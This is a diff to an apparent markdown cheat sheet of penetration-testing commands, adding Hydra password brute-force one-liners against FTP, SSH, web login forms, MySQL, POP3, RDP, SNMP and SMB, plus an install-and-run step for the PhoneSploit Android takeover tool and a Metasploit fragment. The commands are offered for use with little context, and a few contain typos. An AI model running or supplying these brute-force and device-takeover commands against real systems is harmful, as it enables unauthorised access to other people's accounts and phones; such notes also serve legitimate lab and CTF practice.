@@ -40,9 +40,20 @@ set TARGETURI http://IP:port
 set USERNAME admin
 ->run
 ```
-### 7. FTP Password find
-  $ hydra -l user -P passlist.txt ftp://IP
+### 7. Hydra
+``` Use for FTP:
+         $ hydra -l user -P passlist.txt ftp://IP
+    Use for SSH:
+         $ hydra -l <username> -P passwdlist.txt IP -t 4 ssh
+    Use for Web Post:
+         $ hydra -l <username> -P <wordlist> 10.10.46.122 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
 
+- hydra -L usernames.txt -P pass.txt <IP> mysql
+- hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V`
+- hydra -V -f -L <userslist> -P <passwlist> ***rdp***://<IP>`
+- hydra -P common-snmp-community-strings.txt target.com snmp
+- hydra -l Administrator -P words.txt 192.168.1.12 smb t 1
+```
 ### 8. Prints the route that a packet takes to reach the host
   $ traceroute google.com
 
@@ -53,7 +64,7 @@ set USERNAME admin
   
   apt install adb
   pip install colorama
-  git clone https://github.com/aerosol-can/PhoneSploit
+  git clone https://github.com/aerosol-can/PhoneSploit   (if not work use https://github.com/aerosol-can/PhoneSploit)
   cd PhoneSploit
   python3 phonesploit.py
   select 3 to connect new phone
